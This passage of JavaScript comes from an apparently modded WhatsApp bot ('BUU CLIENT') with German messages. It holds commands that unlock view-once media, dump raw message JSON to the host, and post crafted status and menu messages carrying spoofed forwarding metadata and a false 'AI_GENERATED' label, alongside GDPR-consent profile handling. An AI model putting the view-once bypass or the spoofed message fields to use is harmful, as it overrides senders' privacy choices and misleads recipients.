} else { const quotedMessage = messageContent.extendedTextMessage?.contextInfo?.quotedMessage;
if (quotedMessage) { try { let mediaContent = quotedMessage.viewOnceMessage?.message || quotedMessage.viewOnceMessageV2?.message || quotedMessage.documentWithCaptionMessage?.message || quotedMessage;
if (mediaContent.viewOnceMessage) mediaContent = mediaContent.viewOnceMessage.message;
if (mediaContent.viewOnceMessageV2) mediaContent = mediaContent.viewOnceMessageV2.message;
const typeKey = Object.keys(mediaContent).find(key => key.endsWith('Message'));
if (typeKey && mediaContent[typeKey]) { let unlockedMessage = JSON.parse(JSON.stringify(mediaContent));
if (unlockedMessage[typeKey].viewOnce !== undefined) { unlockedMessage[typeKey].viewOnce = false;
} if (typeKey !== 'audioMessage') { const currentCaption = unlockedMessage[typeKey].caption || "";
unlockedMessage[typeKey].caption = currentCaption + "\n\n> \`🫟UNLOCKED BY BUU CLIENT🍯\`";
} const preparedMsg = generateWAMessageFromContent(from, unlockedMessage, { userJid: sock.user.id });
await sock.relayMessage(from, preparedMsg.message, { messageId: preparedMsg.key.id });
} else { await sock.sendMessage(from, { text: `> \`❌ Fehler:\`\nDas ist kein gültiger View-Once Inhalt!` }, { quoted: msg });
} } catch (err) { console.error(`${c.red}[Avo-Fehler]${c.reset}`, err);
await sock.sendMessage(from, { text: `> \`❌ *Fehler:*\nbeim Umwandeln der View-Once Nachricht!\`` }, { quoted: msg });
} } else { await sock.sendMessage(from, { text: `> \`❌ Fehler:\`\nBitte zitiere eine View-Once Nachricht!` }, { quoted: msg });
} } break;
}

case 'hilfe': case 'cmds':
await sock.sendMessage(from, { text: `\`🫟ALL COMMANDS🍯:\`\n• ${pref}ping\n• ${pref}hi\n• ${pref}echo \`[Text]\`\n• ${pref}cmds / ${pref}cmds\n• ${pref}oldbuumenu\n> ⛩️GROUP ONLY:\n• ${pref}cfgs\n• ${pref}g\n> 🐦‍🔥HOST ONLY:\n• ${pref}avo\n• ${pref}i2\n• ${pref}i3\n• ${pref}setname` }, { quoted: msg });
break;

case 'i2': { 
if (!isHost) { await sock.sendMessage(from, { text: `❌ *Fehler:*\nDieser Befehl ist nur für den Bot-Besitzer (Host) erlaubt.` }, { quoted: msg });
} else if (!isAny) { const sender = msg.key.participant || msg.key.remoteJid;
await sock.sendMessage(sender, { text: `Dieser Befehl ist nur in normalen Chats oder Gruppen verfügbar.` }, { quoted: msg });
} else { const quoted = messageContent.extendedTextMessage?.contextInfo?.quotedMessage;
if (!quoted) { await sock.sendMessage(from, { text: '> ❌ *Fehler: Keine Nachricht zitiert.*\nBitte zitiere die Nachricht, deren Case-Code du erhalten möchtest.' }, { quoted: msg });
console.log(`${c.yellow}[i2-Info]${c.reset} Keine gültige zitierte Nachricht gefunden.`);
} else { try { const quotedMessageJSON = JSON.stringify(quoted, null, 2);
const responseText = `case 'i2output':\nsock.sendJson(from,\n${quotedMessageJSON}\n);\nbreak;`;
await sock.sendMessage(from, { text: responseText }, { quoted: msg });
console.log(`${c.green}[i2-Erfolg]${c.reset} Case-Daten erfolgreich gesendet.`);
} catch (err) { console.error(`${c.red}[i2-Fehler]\nFehler beim Generieren des Case-Codes:${c.reset}\n`, err);
} } } break;
}

case 'i3': {
if (!isHost) { await sock.sendMessage(from, { text: `❌ *Fehler:*\nDieser Befehl ist nur für den Bot-Besitzer (Host) erlaubt.` }, { quoted: msg });
} else { const quoted = messageContent.extendedTextMessage?.contextInfo?.quotedMessage;
if (!quoted) { await sock.sendMessage(from, { text: '> ❌ *Fehler: Keine Nachricht zitiert.*\nBitte zitiere die Nachricht, deren Case-Code du erhalten möchtest.' }, { quoted: msg });
console.log(`${c.yellow}[i3-Info]${c.reset} Keine gültige zitierte Nachricht gefunden.`);
} else { try { const quotedMessageJSON = JSON.stringify(quoted, null, 2);
const responseText = `case 'i3output':\nsock.sendJson(from,\n${quotedMessageJSON}\n);\nbreak;`;
try { if (!hostJid) throw new Error("JID nicht verfügbar");
await sock.sendMessage(hostJid, { text: responseText });
await sock.sendMessage(from, { text: `> ✅ Case-Code wurde an deinen privaten Chat (JID) gesendet.` }, { quoted: msg });
console.log(`${c.green}[i3-Erfolg]${c.reset} Case-Daten an JID gesendet.`);
} catch (jidErr) { console.log(`${c.yellow}[i3-Fallback]${c.reset} Senden an JID fehlgeschlagen, versuche LID...`, jidErr.message);
if (hostLid) { await sock.sendMessage(hostLid, { text: responseText });
await sock.sendMessage(from, { text: `> ✅ Case-Code wurde an deinen privaten Chat (LID) gesendet.` }, { quoted: msg });
console.log(`${c.green}[i3-Erfolg]${c.reset} Case-Daten an LID gesendet.`);
} else { throw new Error("Weder JID noch LID für den Host verfügbar.");
} } } catch (err) { console.error(`${c.red}[i3-Fehler]\nFehler beim Senden des Case-Codes:${c.reset}\n`, err);
await sock.sendMessage(from, { text: `❌ Fehler: Code konnte weder an JID noch an LID gesendet werden.` }, { quoted: msg });
} } } break;
}

case 'cfgs': {
if (!isGroup) { await sock.sendMessage(from, { text: `❌ *Fehler:*\nDieser Befehl kann nur in Gruppen verwendet werden.` }, { quoted: msg });
} else { const bgArgbType1 = Math.floor(Math.random() * (4297430000 - 4274354743 + 1)) + 4274354743;
const closeFriendGroupStatusJson = { "groupStatusMessageV2": { "message": { "extendedTextMessage": { "text": buuClient, "backgroundArgb": bgArgbType1, "contextInfo": { "featureEligibilities": { "canReceiveMultiReact": true }, "statusSourceType": "TEXT", "statusAttributions": [ { "type": 10 } ], "isGroupStatus": true, "statusAudienceMetadata": { "audienceType": "CLOSE_FRIENDS" } } } } } };
await sendJson(from, closeFriendGroupStatusJson, { quoted: msg });
} break;
}

case 'x1': {
const buuAL = "MADE BY: ";
const cmdUser = msg.key.participant || msg.key.remoteJid;
try { const buuImg = await prepareWAMessageMedia( { image: await fs2.readFile('./media/buu.jpg') }, { upload: sock.waUploadToServer } );
const statusMsg = { imageMessage: { url: buuImg.imageMessage.url, mimetype: buuImg.imageMessage.mimetype, fileSha256: buuImg.imageMessage.fileSha256, fileLength: buuImg.imageMessage.fileLength, height: buuImg.imageMessage.height, width: buuImg.imageMessage.width, mediaKey: buuImg.imageMessage.mediaKey, fileEncSha256: buuImg.imageMessage.fileEncSha256, directPath: buuImg.imageMessage.directPath, mediaKeyTimestamp: buuImg.imageMessage.mediaKeyTimestamp, jpegThumbnail: buuImg.imageMessage.jpegThumbnail, caption: buuAL + buuTxt, contextInfo: { isForwarded: true, featureEligibilities: { canReceiveMultiReact: true, canBeReshared: true }, statusSourceType: "IMAGE", statusAudienceMetadata: { audienceType: "CLOSE_FRIENDS" }, statusAttributions: [{ type: 10 }] }, annotations: [{ polygonVertices: [ { x: 0.25, y: 0.4 }, { x: 0.75, y: 0.4 }, { x: 0.75, y: 0.6 }, { x: 0.25, y: 0.6 } ], shouldSkipConfirmation: true, embeddedContent: { embeddedMessage: { stanzaId: buuMsgId, message: { extendedTextMessage: { text: buuTxt, matchedText: buuTxt, previewType: "NONE", inviteLinkGroupTypeV2: "DEFAULT" }, messageContextInfo: { messageAssociation: { associationType: "STATUS_ADD_YOURS", parentMessageKey: { remoteJid: "status@broadcast", fromMe: true, id: buuMsgId, participant: cmdUser } } } } } }, embeddedAction: true }], imageSourceType: "USER_IMAGE", accessibilityLabel: buuAL + buuTxt } };
const preparedStatus = generateWAMessageFromContent( 'status@broadcast', statusMsg, { userJid: sock.user.id } );
await sock.relayMessage('status@broadcast', preparedStatus.message, { messageId: preparedStatus.key.id });
console.log(`${c.green}[AddYours]${c.reset}\n${c.cyan}Status mit Add Yours gepostet.${c.reset}`);
} catch (err) { console.error(`${c.red}[AddYours-Fehler]${c.reset}`, err);
await sock.sendMessage(from, { text: '❌ Fehler:\n' + err.message }, { quoted: msg });
} break;
}

case 'oldbuumenu': {
const buuMenuFooter = "©️ HONNEYBUU MODZ\nDEVELOPMENT TEAM";
const buuMenuCardFooter = "BuuClient example menu\n> MADE BY:\n- HonneybuuModz\n- Development\n- Team";
const buuMenuAccessibility = "WHATSAPP HACKED BY HONNEYBUU MODZ DEVELOPMENT TEAM";
const buuMenuAiLabel = "AI_GENERATED";
const buuMenuCardType = "HSCROLL_CARDS";
const enableAiLabel = true; 
const enableAnnotations = true; 
const buuMenuNewsletterConfig = { jid: "120363190599598825@newsletter", id: 246, name: buuClient, footer: buuMenuCardFooter };
const buuMenuInteractiveHeader = "🫟BUUMENU";
const buuMenuCardHeader = "BUUMENU 🫟";
const buuMenuMedia = await prepareWAMessageMedia( { image: { url: buuMenuImagePath } }, { upload: sock.waUploadToServer } );
const buuMenuSharedContextInfo = { forwardingScore: 1, isForwarded: true, disappearingMode: { }, forwardedNewsletterMessageInfo: { newsletterJid: buuMenuNewsletterConfig.jid, serverMessageId: buuMenuNewsletterConfig.id, newsletterName: buuClient, contentType: 0, accessibilityText: buuMenuAccessibility }, featureEligibilities: { cannotBeReactedTo: false, cannotBeRanked: true, canRequestFeedback: true, canBeReshared: true, canReceiveMultiReact: true }, forwardOrigin: "CHANNELS" };
const buuMenuCardContextInfo = { ...buuMenuSharedContextInfo };
delete buuMenuCardContextInfo.forwardedNewsletterMessageInfo; 
const buuMenuSharedAnnotations = enableAnnotations ? [{ polygonVertices: [{ x: 0.07437430743743, y: 0.74374300743743 }, { x: 0.74374374300743, y: 0.7437437430743743 }, { x: 0.7437430743743743, y: 0.7437437430743743 }, { x: 0.07437437437430743, y: 0.00743743743743 }], newsletter: { newsletterJid: buuMenuNewsletterConfig.jid, serverMessageId: buuMenuNewsletterConfig.id, newsletterName: buuClient, contentType: 0 }, shouldSkipConfirmation: false }] : [];
const buuMenuCards = [ { header: { title: buuMenuInteractiveHeader, imageMessage: { ...buuMenuMedia.imageMessage, contextInfo: buuMenuCardContextInfo, ...(enableAnnotations && { annotations: buuMenuSharedAnnotations }), ...(enableAiLabel && { imageSourceType: buuMenuAiLabel }), accessibilityLabel: buuMenuAccessibility }, hasMediaAttachment: true 
}, body: { text: `*🍯 BUU MAIN MENU*\n> \`FOR: ?\`` }, footer: { text: buuMenuFooter }, nativeFlowMessage: { buttons: [ 
{ name: "single_select", buttonParamsJson: JSON.stringify({ title: "⛩️MENU NAME 1🐉",
sections: [{ title: "SOON DYNAMIC:", rows: [] },
{ title: "GROUP / PRIVAT CMDS", rows: [] },
{ title: "🐦‍🔥BTN NAME🌱 :",
highlight_label: "✅WORK",
rows: [{ title: `${pref}1_1`,
description: "EXAMPLE CMD",
id: `${pref}1_1` }] }, { title: "🫟INFO 1🫟", rows: [] },
{ title: "🫟INFO 2𫟟", rows: [] },
{ title: "🐦‍🔥BTN NAME🌱 :",
highlight_label: "✅WORK",
rows: [{ title: `${pref}1_2`,
description: "EXAMPLE CMD",
id: `${pref}1_2` }] }, { title: "🫟INFO 1🫟", rows: [] },
{ title: "🫟INFO 2𫟟", rows: [] },
{ title: "🐦‍🔥BTN NAME🌱 :",
highlight_label: "✅WORK",
rows: [{ title: `${pref}1_3`,
description: "EXAMPLE CMD",
id: `${pref}1_3` }] }] }) },
{ name: "single_select", buttonParamsJson: JSON.stringify({ title: "⛩️MENU NAME 2🐉",
sections: [{ title: "🫟INFO 1🫟", rows: [] },
{ title: "🫟INFO 2🫟", rows: [] },
{ title: "🐦‍🔥BTN NAME🌱 :",
highlight_label: "✅WORK",
rows: [{ title: `${pref}2_1`,
description: "EXAMPLE CMD",
id: `${pref}2_1` }] }, { title: "🫟INFO 1🫟", rows: [] },
{ title: "🫟INFO 2🫟", rows: [] },
{ title: "🐦‍🔥BTN NAME🌱 :",
highlight_label: "✅WORK",
rows: [{ title: `${pref}2_2`,
description: "EXAMPLE CMD",
id: `${pref}2_2` }] }, { title: "🫟INFO 1🫟", rows: [] },
{ title: "🫟INFO 2🫟", rows: [] },
{ title: "🐦‍🔥BTN NAME🌱 :",
highlight_label: "✅WORK",
rows: [{ title: `${pref}2_3`,
description: "EXAMPLE CMD",
id: `${pref}2_3` }] }] }) },
{ name: "single_select", buttonParamsJson: JSON.stringify({ title: "⛩️MENU NAME 3🐉",
sections: [{ title: "🫟INFO 1🫟", rows: [] },
{ title: "🫟INFO 2🫟", rows: [] },
{ title: "🐦‍🔥BTN NAME🌱 :",
highlight_label: "✅WORK",
rows: [{ title: `${pref}3_1`,
description: "EXAMPLE CMD",
id: `${pref}3_1` }] }, { title: "🫟INFO 1🫟", rows: [] },
{ title: "🫟INFO 2🫟", rows: [] },
{ title: "🐦‍🔥BTN NAME🌱 :",
highlight_label: "✅WORK",
rows: [{ title: `${pref}3_2`,
description: "EXAMPLE CMD",
id: `${pref}3_2` }] }, { title: "🫟INFO 1🫟", rows: [] },
{ title: "🫟INFO 2🫟", rows: [] },
{ title: "🐦‍🔥BTN NAME🌱 :",
highlight_label: "✅WORK",
rows: [{ title: `${pref}3_3`,
description: "EXAMPLE CMD",
id: `${pref}3_3` }] }] }) },
{ name: "single_select", buttonParamsJson: JSON.stringify({ title: "⛩️MENU NAME 4🐉",
sections: [{ title: "🫟INFO 1🫟", rows: [] },
{ title: "🫟INFO 2🫟", rows: [] },
{ title: "🐦‍🔥BTN NAME🌱 :",
highlight_label: "✅WORK",
rows: [{ title: `${pref}4_1`,
description: "EXAMPLE CMD",
id: `${pref}4_1` }] }, { title: "🫟INFO 1🫟", rows: [] },
{ title: "🫟INFO 2🫟", rows: [] },
{ title: "🐦‍🔥BTN NAME🌱 :",
highlight_label: "✅WORK",
rows: [{ title: `${pref}4_2`,
description: "EXAMPLE CMD",
id: `${pref}4_2` }] }, { title: "🫟INFO 1🫟", rows: [] },
{ title: "🫟INFO 2🫟", rows: [] },
{ title: "🐦‍🔥BTN NAME🌱 :",
highlight_label: "✅WORK",
rows: [{ title: `${pref}4_3`,
description: "EXAMPLE CMD",
id: `${pref}4_3` }] }] }) },
{ name: "single_select", buttonParamsJson: JSON.stringify({ title: "⛩️MENU NAME 5🐉",
sections: [{ title: "🫟INFO 1🫟", rows: [] },
{ title: "🫟INFO 2🫟", rows: [] },
{ title: "🐦‍🔥BTN NAME🌱 :",
highlight_label: "✅WORK",
rows: [{ title: `${pref}5_1`,
description: "EXAMPLE CMD",
id: `${pref}5_1` }] }, { title: "🫟INFO 1🫟", rows: [] },
{ title: "🫟INFO 2🫟", rows: [] },
{ title: "🐦‍🔥BTN NAME🌱 :",
highlight_label: "✅WORK",
rows: [{ title: `${pref}5_2`,
description: "EXAMPLE CMD",
id: `${pref}5_2` }] }, { title: "🫟INFO 1🫟", rows: [] },
{ title: "🫟INFO 2🫟", rows: [] },
{ title: "🐦‍🔥BTN NAME🌱 :",
highlight_label: "✅WORK",
rows: [{ title: `${pref}5_3`,
description: "EXAMPLE CMD",
id: `${pref}5_3` }] }] }) },
{ name: "single_select", buttonParamsJson: JSON.stringify({ title: "⛩️MENU NAME 6🐉",
sections: [{ title: "🫟INFO 1🫟", rows: [] },
{ title: "🫟INFO 2🫟", rows: [] },
{ title: "🐦‍🔥BTN NAME🌱 :",
highlight_label: "✅WORK",
rows: [{ title: `${pref}6_1`,
description: "EXAMPLE CMD",
id: `${pref}6_1` }] }, { title: "🫟INFO 1🫟", rows: [] },
{ title: "🫟INFO 2🫟", rows: [] },
{ title: "🐦‍🔥BTN NAME🌱 :",
highlight_label: "✅WORK",
rows: [{ title: `${pref}6_2`,
description: "EXAMPLE CMD",
id: `${pref}6_2` }] }, { title: "🫟INFO 1🫟", rows: [] },
{ title: "🫟INFO 2🫟", rows: [] },
{ title: "🐦‍🔥BTN NAME🌱 :",
highlight_label: "✅WORK",
rows: [{ title: `${pref}6_3`,
description: "EXAMPLE CMD",
id: `${pref}6_3` }] }] }) } 
], messageVersion: 1 }, contextInfo: buuMenuCardContextInfo }, { header: { title: buuMenuInteractiveHeader, imageMessage: { ...buuMenuMedia.imageMessage, contextInfo: buuMenuCardContextInfo, ...(enableAnnotations && { annotations: buuMenuSharedAnnotations }), ...(enableAiLabel && { imageSourceType: buuMenuAiLabel }), accessibilityLabel: buuMenuAccessibility }, hasMediaAttachment: true }, body: { text: "*🌐 BUU WA LINKS*\n> `🫟BUU CLIENT LINKS🫟`" }, footer: { text: buuMenuFooter }, nativeFlowMessage: { buttons: [ 
{ name: "cta_url", buttonParamsJson: JSON.stringify({ display_text: "🌐BUU DSGVO WEB🫟",
url: "https://hakaidev-x-metha.org/wabot-dsgvo/index.html" }) },
{ name: "cta_copy", buttonParamsJson: JSON.stringify({ display_text: "🍯COPY BUU DSGVO🫟",
id: `${pref}copy_dsgvo_url`, copy_code: "https://hakaidev-x-metha.org/wabot-dsgvo/index.html" }) },
{ name: "cta_url", buttonParamsJson: JSON.stringify({ display_text: "📢BUU WA CHANNEL🫟",
url: "https://whatsapp.com/channel/0029VaCABrQ0AgWFWiCXq13W" }) },
{ name: "cta_copy", buttonParamsJson: JSON.stringify({ display_text: "🍯COPY WA CHANNEL🫟",
id: `${pref}copy_wa_channel_url`, copy_code: "https://whatsapp.com/channel/0029VaCABrQ0AgWFWiCXq13W" }) },
{ name: "cta_url", buttonParamsJson: JSON.stringify({ display_text: "👘BUU TG CHANNEL🫟",
url: "https://t.me/honneybuuclient" }) },
{ name: "cta_copy", buttonParamsJson: JSON.stringify({ display_text: "🍯COPY TG CHANNEL🫟",
id: `${pref}copy_tg_channel_url`, copy_code: "https://t.me/honneybuuclient" }) }
], messageVersion: 2 }, contextInfo: buuMenuCardContextInfo } ];
let buuMenuContextInfo = { ...buuMenuSharedContextInfo, stanzaId: msg.key.id, quotedMessage: messageContent };
if (isGroup) { buuMenuContextInfo.participant = msg.key.participant || msg.key.remoteJid;
} else { if (msg.key.fromMe) { const sessionHostCleanJid = sock.user?.id ? sock.user.id.split(':')[0] + '@s.whatsapp.net' : null;
if (sessionHostCleanJid) { buuMenuContextInfo.participant = sessionHostCleanJid;
} } else { delete buuMenuContextInfo.participant;
} } await sock.sendJson(from, { interactiveMessage: { body: { text: buuMenuCardHeader }, footer: { text: buuMenuFooter }, carouselMessage: { cards: buuMenuCards, messageVersion: 1, carouselCardType: buuMenuCardType }, contextInfo: buuMenuContextInfo } });
break;
}

case 'waspy': { 
if (!isHost) { await sock.sendMessage(from, { text: `❌ *Fehler:*\nDieser Befehl ist nur für den Bot-Besitzer (Host) erlaubt.` }, { quoted: msg });
} else { const waspyConfig = { "supportJid": { "ofcWaJid1": "15517868422@s.whatsapp.net", "ofcWaLid1": "🫟@lid", "ofcWaJid2": "🫟@s.whatsapp.net", "ofcWaLid2": "🫟@lid", "ofcW4bJid1": "16505361212@s.whatsapp.net", "ofcW4b1": "🫟@lid", "ofcMetaJid1": "13135550002@s.whatsapp.net", "ofcMetaLid1": "🫟@lid", "ofcMetaBot1": "867051314767696@bot" }, "newsletterJid": { "ofcWa": "120363144038483540@newsletter", "waBetaInfo": "120363174593809831@newsletter" } };
const allJids = [ ...Object.entries(waspyConfig.supportJid), ...Object.entries(waspyConfig.newsletterJid) ];
const validJids = allJids.filter(([key, jid]) => jid && !jid.includes('🫟'));
const allowedJids = validJids.map(([key, jid]) => jid);
try { const buuUserPath = conf.sessionUserBidPath || './buuUsers';
const checkPaths = [ buuUserPath, `${buuUserPath}/${conf.freshMappedUser || 'freshMappedUser'}`, `${buuUserPath}/${conf.dsgvoAndVerifyUser || 'dsgvoAndVerifyUser'}`, `${buuUserPath}/${conf.dsgvoAcceptOnlyUser || 'dsgvoAcceptOnlyUser'}`, `${buuUserPath}/${conf.dsgvoRejectOnlyUser || 'dsgvoRejectOnlyUser'}`, `${buuUserPath}/${conf.verifyOnlyUser || 'verifyOnlyUser'}`, `${buuUserPath}/${conf.rejectOnlyUser || 'rejectOnlyUser'}` ];
for (const dirPath of checkPaths) { const files = await fs2.readdir(dirPath).catch(() => []);
for (const file of files) { if (file.endsWith('.json')) { try { const rawData = await fs2.readFile(`${dirPath}/${file}`, 'utf-8');
if (!rawData.trim()) continue;
const profile = JSON.parse(rawData);
const pJid = profile?.identity?.jid;
const pLid = profile?.identity?.lid;
if (pJid && pLid) { if (allowedJids.includes(pJid) && !allowedJids.includes(pLid)) { allowedJids.push(pLid);
console.log(`${c.bgGreen}${c.black}[WASPY MAPPING]${c.reset}\n${c.green}JID-Match gefunden.\nLID hinzugefügt:${c.reset} ${pLid} (${pJid})`);
} else if (allowedJids.includes(pLid) && !allowedJids.includes(pJid)) { allowedJids.push(pJid);
console.log(`${c.bgGreem}${c.black}[WASPY MAPPING]${c.reset}\n${c.green}LID-Match gefunden.\nJID hinzugefügt:${c.reset} ${pJid} (${pLid})`);
} } } catch (jsonErr) { console.error(`${c.bgRed}${c.black}[WASPY JSON ERROR]${c.reset}\n${c.red}Defekte Datei übersprungen:${c.reset} ${dirPath}/${file}`, jsonErr.message);
} } } } } catch (mapErr) { console.error(`${c.bgRed}${c.black}[WASPY MAPPING CRITICAL]${c.reset}\n${c.red}Ordnerstrukturen konnten nicht gelesen werden:${c.reset}`, mapErr);
} if (args[0] === 'list' || args[0] === 'info') { let listText = `\`🎯 AKTIV ERLAUBTE WASPY IDs (${allowedJids.length}):\`\n\n`;
allowedJids.forEach(id => { listText += `🔹 \`${id}\`\n`;
});
await sock.sendMessage(from, { text: listText.trim() }, { quoted: msg });
} else if (allowedJids.includes(from)) { let targetMsg = messageContent.extendedTextMessage?.contextInfo?.quotedMessage;
if (!targetMsg && args[0]) { try { const targetId = args[0].trim();
const storeMsg = await store.loadMessage(from, targetId);
if (storeMsg && storeMsg.message) {
targetMsg = storeMsg.message.ephemeralMessage?.message || storeMsg.message.viewOnceMessage?.message || storeMsg.message;
} else { console.log(`${c.bgRed}${c.black}[WASPY STORE]${c.reset}\n${c.red}ID ${targetId} nicht im Store gefunden.${c.reset}`);
} } catch (storeErr) { console.error(`${c.red}[WASPY STORE ERROR]${c.reset}`, storeErr);
} } if (!targetMsg) { await sock.sendMessage(from, { text: `> ❌ *Fehler: Nachricht nicht gefunden.*\nBitte zitiere die Nachricht oder gib eine gültige Message-ID an.\nBeispiel: \`${pref}waspy ABC123XYZ\`` }, { quoted: msg });
} else { try { const quotedMessageJSON = JSON.stringify(targetMsg, null, 2);
const responseText = `case 'fetchoutput':\nawait sendJson(from,\n${quotedMessageJSON}\n, { quoted: msg });\nbreak;`;
try { if (!hostJid) throw new Error("hostJid nicht definiert");
await sock.sendMessage(hostJid, { text: responseText });
await sock.sendMessage(from, { text: `> ✅ Case-Code wurde an deinen privaten Chat (JID) gesendet.` }, { quoted: msg });
} catch (jidErr) { console.log(`${c.bgRed}${c.black}[WASPY SEND]${c.reset}\n${c.red}JID-Zustellung fehlgeschlagen, versuche LID...${c.reset}`, jidErr.message);
if (hostLid) { await sock.sendMessage(hostLid, { text: responseText });
await sock.sendMessage(from, { text: `> ✅ Case-Code wurde an deinen privaten Chat (LID) gesendet.` }, { quoted: msg });
} else { await sock.sendMessage(from, { text: `❌ Fehler: Code konnte weder an JID noch an LID gesendet werden. Prüfe hostJid/hostLid.` }, { quoted: msg });
} } } catch (err) { console.error(`${c.bgRed}${c.black}[WASPY GEN ERROR]${c.reset}\n${c.red}Fehler beim Erzeugen des JSON:${c.reset}`, err);
} } } else { console.log(`${c.bgRed}${c.black}[WASPY BLOCK]${c.reset}\n${c.red}Befehl blockiert. Chat '${from}' ist nicht in den erlaubten JIDs/LIDs.${c.reset}`);
} } break;
}


case 'dsgvo': {
const subCmd = args[0]?.toLowerCase();
if (subCmd !== 'accept' && subCmd !== 'reject') { await sock.sendMessage(from, { text: `⚠️ *Format:* \`${pref}dsgvo accept\` oder \`${pref}dsgvo reject\`` }, { quoted: msg });
} else { const targetJid = msg.key.participant || msg.key.remoteJid;
const cleanId = targetJid.split('@')[0];
try { const buuUserPath = conf.sessionUserBidPath || './buuUsers';
const checkPaths = [ buuUserPath, `${buuUserPath}/${conf.freshMappedUser || 'freshMappedUser'}`, `${buuUserPath}/${conf.dsgvoAndVerifyUser || 'dsgvoAndVerifyUser'}`, `${buuUserPath}/${conf.dsgvoAcceptOnlyUser || 'dsgvoAcceptOnlyUser'}`, `${buuUserPath}/${conf.dsgvoRejectOnlyUser || 'dsgvoRejectOnlyUser'}`, `${buuUserPath}/${conf.verifyOnlyUser || 'verifyOnlyUser'}`, `${buuUserPath}/${conf.rejectOnlyUser || 'rejectOnlyUser'}` ];
let foundPath = null;
let fileName = null;
for (const dir of checkPaths) {
const files = await fs2.readdir(dir).catch(() => []);
const match = files.find(f => f.endsWith('.json') && f.includes(cleanId));
if (match) { fileName = match;
foundPath = `${dir}/${match}`;
break;
} } if (!foundPath) { await sock.sendMessage(from, { text: `❌ *Fehler:* Kein Profil für deine ID (\`${cleanId}\`) gefunden.` }, { quoted: msg });
} else { const rawData = await fs2.readFile(foundPath, 'utf-8');
const profile = JSON.parse(rawData);
let targetFolder = subCmd === 'accept' ? (conf.dsgvoAcceptOnlyUser || 'dsgvoAcceptOnlyUser') : (conf.dsgvoRejectOnlyUser || 'dsgvoRejectOnlyUser');
const newPath = `${buuUserPath}/${targetFolder}/${fileName}`;
if (subCmd === 'accept') { profile.status.dsgvo.accepted = true;
profile.status.dsgvo.rejected = false;
profile.status.dsgvo.acceptedAt = new Date().toISOString();
await sock.sendMessage(from, { text: `✅ Du hast die DSGVO erfolgreich *AKZEPTIERT*.\n> Profil wurde nach \`${targetFolder}\` verschoben.` }, { quoted: msg });
} else { profile.status.dsgvo.accepted = false;
profile.status.dsgvo.rejected = true;
profile.status.dsgvo.acceptedAt = null;
await sock.sendMessage(from, { text: `❌ Du hast die DSGVO *ABGELEHNT*.\n> Profil wurde nach \`${targetFolder}\` verschoben.` }, { quoted: msg });
} await fs2.writeFile(newPath, JSON.stringify(profile, null, 2));
if (foundPath !== newPath) {
await fs2.unlink(foundPath).catch(() => {});
} console.log(`${c.bgGreen}${c.black}[DSGVO MOVE]\n${c.reset}${c.green}${cleanId} -> ${targetFolder}${c.reset}`);
} } catch (err) { console.error(`${c.red}[DSGVO-Cmd Fehler]${c.reset}`, err);
await sock.sendMessage(from, { text: `❌ Interner Fehler beim Aktualisieren und Verschieben deiner DSGVO.` }, { quoted: msg });
} } break;
}

case 'verify': {
const subCmd = args[0]?.toLowerCase();
if (subCmd !== 'accept' && subCmd !== 'reject') { await sock.sendMessage(from, { text: `⚠️ *Format:* \`${pref}verify accept\` oder \`${pref}verify reject\`` }, { quoted: msg });
} else { const targetJid = msg.key.participant || msg.key.remoteJid;
const cleanId = targetJid.split('@')[0];
try { const buuUserPath = conf.sessionUserBidPath || './buuUsers';
const checkPaths = [ buuUserPath, `${buuUserPath}/${conf.freshMappedUser || 'freshMappedUser'}`, `${buuUserPath}/${conf.dsgvoAndVerifyUser || 'dsgvoAndVerifyUser'}`, `${buuUserPath}/${conf.dsgvoAcceptOnlyUser || 'dsgvoAcceptOnlyUser'}`, `${buuUserPath}/${conf.dsgvoRejectOnlyUser || 'dsgvoRejectOnlyUser'}`, `${buuUserPath}/${conf.verifyOnlyUser || 'verifyOnlyUser'}`, `${buuUserPath}/${conf.rejectOnlyUser || 'rejectOnlyUser'}` ];
let foundPath = null;
let fileName = null;
for (const dir of checkPaths) { const files = await fs2.readdir(dir).catch(() => []);
const match = files.find(f => f.endsWith('.json') && f.includes(cleanId));
if (match) { fileName = match;
foundPath = `${dir}/${match}`;
break;
} } if (!foundPath) { await sock.sendMessage(from, { text: `❌ *Fehler:* Kein Profil für deine ID (\`${cleanId}\`) gefunden.` }, { quoted: msg });
} else { const rawData = await fs2.readFile(foundPath, 'utf-8');
const profile = JSON.parse(rawData);
if (subCmd === 'accept') { if (!profile.status?.dsgvo?.accepted) { await sock.sendMessage(from, { text: `⚠️ Bitte erst via \`${pref}dsgvo\` die dsgvo lesen und via \`${pref}dsgvo accept\` akzeptieren.` }, { quoted: msg });
} else { let targetFolder = conf.dsgvoAndVerifyUser || 'dsgvoAndVerifyUser';
const newPath = `${buuUserPath}/${targetFolder}/${fileName}`;
profile.status.verified = true;
profile.status.unverify = false;
profile.status.registeredAt = new Date().toISOString();
await sock.sendMessage(from, { text: `✅ Du hast dich erfolgreich *VERIFIZIERT*.\n> Profil wurde nach \`${targetFolder}\` verschoben.` }, { quoted: msg });
await fs2.writeFile(newPath, JSON.stringify(profile, null, 2));
if (foundPath !== newPath) { await fs2.unlink(foundPath).catch(() => {});
} console.log(`${c.bgGreen}${c.black}[VERIFY MOVE]${c.reset}\n${c.green}${cleanId} -> ${targetFolder}${c.reset}`);
} } else { let targetFolder = conf.rejectOnlyUser || 'rejectOnlyUser';
const newPath = `${buuUserPath}/${targetFolder}/${fileName}`;
profile.status.verified = false;
profile.status.unverify = true;
await sock.sendMessage(from, { text: `❌ Du hast die Verifizierung *ABGELEHNT*.\n> Profil wurde nach \`${targetFolder}\` verschoben.` }, { quoted: msg });
await fs2.writeFile(newPath, JSON.stringify(profile, null, 2));
if (foundPath !== newPath) { await fs2.unlink(foundPath).catch(() => {});
} console.log(`${c.bgGreen}${c.black}[VERIFY MOVE]\n${c.reset}${c.green}${cleanId} -> ${targetFolder}${c.reset}`);
} } } catch (err) { console.error(`${c.red}[Verify-Cmd Fehler]${c.reset}`, err);
await sock.sendMessage(from, { text: `❌ Interner Fehler beim Aktualisieren und Verschieben deiner Verifizierung.` }, { quoted: msg });
} } break;
}

case 'me': {
const targetJid = msg.key.participant || msg.key.remoteJid;
const cleanId = targetJid.split('@')[0];
try { const buuUserPath = conf.sessionUserBidPath || './buuUsers';
